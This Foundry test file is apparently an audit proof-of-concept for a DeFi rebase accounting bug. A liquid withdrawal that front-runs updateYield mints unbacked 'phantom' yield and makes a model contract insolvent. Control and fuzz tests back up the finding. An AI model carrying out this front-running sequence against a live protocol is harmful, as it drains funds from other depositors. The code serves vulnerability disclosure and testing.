// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {TiziRebaseModel} from "../src/TiziRebaseModel.sol";

/// @notice Proves the Tizi "async-snapshot rebase contamination" (split-brain accounting) finding with NUMBERS:
///  a LIQUID withdrawal front-running updateYield mints unbacked phantom yield into stTD (protocol goes insolvent),
///  while the SAME withdrawal via the NFT path is correctly compensated (zero phantom) -- proving the bug is the
///  surgical missing-compensator on the liquid path, not a misread.
contract FlowStraddleTest is Test {
    TiziRebaseModel internal m;
    uint256 internal constant PD = 1e12;

    function setUp() public {
        m = new TiziRebaseModel();
        m.deposit(1000e6);     // 1000 USDC deposited -> 1000e18 TD ; netAsset = 1000e18 ; vault = 1000 USDC
        m.strategiesStats();   // admin snapshots NAV = 1000e18 (consistent with netAsset at this instant)
        assertTrue(m.solvent(), "setUp: start fully solvent");
        assertEq(m.navSnapshot(), 1000e18);
        assertEq(m.netAsset(), 1000e18);
    }

    /// THE BUG: liquid withdrawal between the NAV snapshot and updateYield -> phantom yield + insolvency.
    function test_LiquidWithdraw_MintsPhantomYield_AndBreaksSolvency() public {
        uint256 stBefore = m.stTDPool();

        // attacker front-runs the admin's updateYield with a 100 TD LIQUID withdrawal
        m.withdrawLiquid(100e18); // netAsset 1000->900e18 ; vault 1000->900 USDC ; navSnapshot STILL 1000e18 (stale)

        m.updateYield();          // newNetAsset = 1000e18 - 0 = 1000e18 ; delta = +100e18 -> mints 100e18 phantom TD

        uint256 phantom = m.stTDPool() - stBefore;
        console2.log("phantom yield minted to stTD (TD):", phantom / 1e18);
        console2.log("real USDC backing (USDC):         ", m.vaultUSDC() / 1e6);
        console2.log("TD supply (TD):                   ", m.tdSupply() / 1e18);

        assertEq(phantom, 100e18, "liquid path minted +100 TD of UNBACKED phantom yield");
        assertFalse(m.solvent(), "protocol is now INSOLVENT: TD supply 1000 > backing 900 USDC");
    }

    /// THE CONTROL: identical withdrawal via the NFT path -> nftQueueUSDC compensates -> zero phantom.
    function test_NFTWithdraw_IsCompensated_NoPhantom() public {
        uint256 stBefore = m.stTDPool();

        m.withdrawNFT(100e18);    // netAsset 1000->900e18 ; nftQueueUSDC += 100 USDC

        m.updateYield();          // newNetAsset = 1000e18 - 100e18 = 900e18 ; delta = 0 -> no phantom

        assertEq(m.stTDPool() - stBefore, 0, "NFT path: nftQueueUSDC compensates -> zero phantom yield");
    }

    /// Fuzz the surgical claim: for ANY liquid withdrawal w (0 < w <= deposit), phantom == w and backing drops by w.
    function testFuzz_PhantomEqualsLiquidWithdrawal(uint256 w) public {
        w = bound(w, 1e18, 1000e18);
        uint256 stBefore = m.stTDPool();
        uint256 backingBefore = m.vaultUSDC();

        m.withdrawLiquid(w);
        m.updateYield();

        assertEq(m.stTDPool() - stBefore, w, "phantom yield == the liquid-withdrawn amount");
        assertEq(backingBefore - m.vaultUSDC(), w / PD, "real backing dropped by exactly the withdrawal");
    }
}
